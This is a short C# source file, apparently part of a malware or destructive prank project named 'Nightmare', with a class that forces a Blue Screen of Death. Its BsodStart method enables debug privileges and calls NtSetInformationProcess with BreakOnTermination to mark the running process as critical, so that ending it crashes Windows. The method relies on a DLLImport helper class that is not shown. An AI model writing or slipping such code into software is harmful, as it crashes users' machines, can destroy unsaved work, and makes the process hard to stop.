using System.Diagnostics;

namespace Nightmare
{
    public class Bsod // Blue Screen Of Death
    {
        public static void BsodStart()
        {
            Process.EnterDebugMode();
            DLLImport.NtSetInformationProcess(Process.GetCurrentProcess().Handle, DLLImport.BreakOnTermination, ref DLLImport.isCritical, sizeof(int));
        }
    }
}